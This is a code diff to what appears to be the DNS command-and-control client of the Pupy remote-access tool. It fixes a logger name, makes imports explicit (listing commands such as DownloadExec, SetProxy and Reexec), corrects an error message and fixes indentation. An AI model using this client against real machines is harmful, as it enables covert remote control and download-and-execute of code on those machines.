@@ -23,13 +23,26 @@ import ascii85
 try:
     import dnslib
 except ImportError:
-    logger.info('dnslib not available')
+    logging.info('dnslib not available')
     dnslib = None
 
 from Crypto.Random import get_random_bytes
 
 from ecpv import ECPV
-from picocmd import *
+from picocmd import (
+    Poll, Ack,
+    SystemStatus,
+    Sleep, CheckConnect,
+    Reexec, Exit, Disconnect,
+    Policy, Kex, SystemInfo,
+    SetProxy, Connect, DownloadExec,
+    PasteLink,
+    OnlineStatusRequest, PupyState,
+    Error, ParcelInvalidCrc,
+    ParcelInvalidPayload,
+    Parcel,
+    from_bytes, to_bytes
+)
 
 CLIENT_VERSION = 2
 
@@ -404,7 +417,7 @@ class DnsCommandsClient(Thread):
             logging.debug('NEED TO ACK: {}'.format(need_ack))
             ack_response = self._request(Ack(need_ack))
             if not ( len(ack_response) == 1 and isinstance(ack_response[0], Ack)):
-                logging.error('ACK <-> ACK failed: received: {}'.format(ack))
+                logging.error('ACK <-> ACK failed: received: {}'.format(ack_response))
 
         for command in commands:
             logging.debug('command: {}'.format(command))
@@ -417,7 +430,7 @@ class DnsCommandsClient(Thread):
                     kex = Kex(request)
                     response = self._request(kex)
                     if not len(response) == 1 or not isinstance(response[0], Kex):
-                    	logging.error('KEX sequence failed. Got {} instead of Kex'.format(
+                        logging.error('KEX sequence failed. Got {} instead of Kex'.format(
                             response))
                         return
 
@@ -485,7 +498,7 @@ class DnsCommandsClient(Thread):
                 logging.exception(e)
 
             if self.active:
-            	logging.debug('sleep {}'.format(self.poll))
+                logging.debug('sleep {}'.format(self.poll))
                 time.sleep(self.poll)
             else:
                 break
